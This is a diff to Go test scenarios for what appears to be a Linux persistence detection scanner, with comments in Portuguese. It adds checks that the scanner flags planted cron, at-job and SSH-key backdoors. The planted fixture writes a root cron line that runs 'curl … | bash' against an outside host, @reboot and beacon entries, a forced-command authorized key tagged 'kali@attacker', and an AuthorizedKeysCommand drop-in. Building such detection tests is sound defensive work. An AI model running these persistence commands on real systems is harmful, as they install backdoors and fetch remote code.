@@ -42,6 +42,18 @@ const persistencia = `mkdir -p /etc/systemd/system/ssh.service.d /etc/systemd/sy
 	printf 'LD_PRELOAD=/dev/shm/x.so\n' >> /etc/environment
 	printf '/usr/lib/libsysinit.so\n' > /etc/ld.so.preload`
 
+// agendamentoEChaves planta as duas persistências mais COMUNS em invasão real:
+// uma linha de cron e uma chave em authorized_keys. Vêm antes de systemd na
+// frequência com que aparecem, e depois na ordem em que foram implementadas —
+// unit veio primeiro porque o coletor era o mais difícil, não o mais frequente.
+const agendamentoEChaves = `mkdir -p /etc/cron.d /var/spool/cron/crontabs /root/.ssh /var/spool/cron/atjobs /etc/ssh/sshd_config.d
+	printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.7/a | bash"\n' > /etc/cron.d/zz-update
+	printf '@reboot /tmp/.x\n*/3 * * * * /usr/local/bin/beacon\n' > /var/spool/cron/crontabs/root
+	printf 'command="/tmp/.k",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx kali@attacker\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx lex@estacao\n' > /root/.ssh/authorized_keys
+	printf 'export SSH_CONNECTION="203.0.113.9 51234 10.0.0.5 22"\nexport USER=root\n/tmp/.later\n' > /var/spool/cron/atjobs/a00001019
+	printf 'AuthorizedKeysCommand /usr/local/sbin/keyfetch\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config.d/99-x.conf
+	printf 'Port 22\n' > /etc/ssh/sshd_config`
+
 func init() {
 	// ---------------------------------------------------------------- negativos
 	//
@@ -61,6 +73,8 @@ func init() {
 			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
 			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
 			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
+			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
+			"persist.ssh_forced_command", "persist.sshd_key_source",
 		},
 		Exit: 0,
 	})
@@ -260,6 +274,8 @@ func init() {
 			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
 			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
 			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
+			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
+			"persist.ssh_forced_command", "persist.sshd_key_source",
 		},
 		Exit: 0,
 	})
@@ -486,6 +502,42 @@ func init() {
 		},
 		// E a cobertura precisa CAIR dizendo isso — imagem sem processo não é
 		// host sem implante.
+		MustBeIncomplete: true,
+		Exit:             2,
+	})
+
+	Register(Scenario{
+		ID:     "62-cron-e-chaves",
+		Desc:   "as duas persistências mais comuns em invasão real: cron e authorized_keys",
+		Images: matriz,
+		Plant:  agendamentoEChaves,
+		Expect: []Expect{
+			{ID: "persist.cron_suspect", Sev: "CRITICAL", Evidence: "roda como: root"},
+			{ID: "persist.cron_frequent", Sev: "WARN"},
+			// o at dispara UMA vez no futuro, e carrega o ambiente de quem o criou
+			{ID: "persist.at_job", Sev: "CRITICAL", Evidence: "203.0.113.9"},
+			{ID: "persist.ssh_forced_command", Sev: "CRITICAL", Evidence: "kali@attacker"},
+			{ID: "persist.sshd_key_source", Sev: "WARN", Subject: "AuthorizedKeysCommand"},
+			// inventário é MANUAL: "esta chave é de alguém do time?" não é
+			// decidível por máquina
+			{ID: "persist.ssh_keys", Sev: "MANUAL", Subject: "root"},
+		},
+		Exit: 2,
+	})
+
+	Register(Scenario{
+		ID:   "63-cron-e-chaves-em-imagem",
+		Desc: "o mesmo plantio varrido DE FORA: agendamento e chave saem do disco",
+		// Nada aqui depende de /proc, de crontab -l ou de sshd -T. É o que
+		// permite responder sobre um host cujo userland não é confiável.
+		Images: minimal,
+		Mode:   Image,
+		Plant:  agendamentoEChaves,
+		Expect: []Expect{
+			{ID: "persist.cron_suspect", Sev: "CRITICAL"},
+			{ID: "persist.ssh_forced_command", Sev: "CRITICAL"},
+			{ID: "persist.at_job"},
+		},
 		MustBeIncomplete: true,
 		Exit:             2,
 	})
